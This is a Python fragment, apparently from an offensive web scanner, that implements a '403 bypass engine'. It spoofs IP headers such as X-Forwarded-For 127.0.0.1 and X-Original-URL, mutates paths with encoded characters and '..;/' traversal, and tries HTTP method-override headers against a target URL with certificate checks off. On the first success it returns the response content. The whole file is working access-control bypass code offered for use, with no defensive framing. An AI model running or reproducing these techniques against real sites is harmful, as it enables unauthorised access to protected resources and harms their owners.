# 🛡️  v43 ENHANCED 403 BYPASS ENGINE
# ══════════════════════════════════════════════════

_403_BYPASS_TECHNIQUES = [
    # (header_dict, description)
    lambda url: {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
    lambda url: {'X-Forwarded-For': '::1', 'X-Real-IP': '::1'},
    lambda url: {'X-Original-URL': urlparse(url).path, 'X-Rewrite-URL': urlparse(url).path},
    lambda url: {'X-Custom-IP-Authorization': '127.0.0.1', 'X-Forwarded-Host': urlparse(url).netloc},
    lambda url: {'Referer': url, 'X-Forwarded-For': f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'},
]

_403_PATH_MUTATIONS = [
    lambda p: p,                          # original
    lambda p: p + '/',                    # trailing slash
    lambda p: p + '/.',                   # dot bypass
    lambda p: p + '%20',                  # space encoding
    lambda p: p + '%09',                  # tab encoding
    lambda p: p + '?',                    # query bypass
    lambda p: p + '#',                    # fragment bypass
    lambda p: p + '..;/',                 # path traversal
    lambda p: '/' + p.lstrip('/').replace('/', '/./'),  # dot-segment
    lambda p: p.upper() if p.isalpha() else p,          # case change
]

async def _bypass_403_async(session: aiohttp.ClientSession, url: str, timeout: int = 10) -> tuple:
    """
    Try multiple 403 bypass techniques on a URL.
    Returns (success: bool, status: int, response_text: str, technique: str)
    """
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or '/'

    # Phase 1: Header-based bypass
    for i, get_hdrs in enumerate(_403_BYPASS_TECHNIQUES):
        try:
            hdrs = {**_get_headers(bypass_403=True), **get_hdrs(url)}
            async with session.get(url, headers=hdrs, timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    text = await r.text()
                    return True, r.status, text[:500], f"Header bypass #{i+1}"
        except Exception:
            pass

    # Phase 2: Path mutation bypass
    for i, mutate in enumerate(_403_PATH_MUTATIONS):
        try:
            mutated_url = base + mutate(path)
            async with session.get(mutated_url, headers=_get_headers(bypass_403=True),
                                   timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    text = await r.text()
                    return True, r.status, text[:500], f"Path mutation #{i+1}"
        except Exception:
            pass

    # Phase 3: HTTP method override
    for method_header in ['X-HTTP-Method-Override', 'X-Method-Override', 'X-HTTP-Method']:
        try:
            hdrs = {**_get_headers(bypass_403=True), method_header: 'GET'}
            async with session.post(url, headers=hdrs, timeout=aiohttp.ClientTimeout(total=timeout),
                                    ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    text = await r.text()
                    return True, r.status, text[:500], f"Method override: {method_header}"
        except Exception:
            pass

    return False, 403, '', 'All bypass techniques failed'


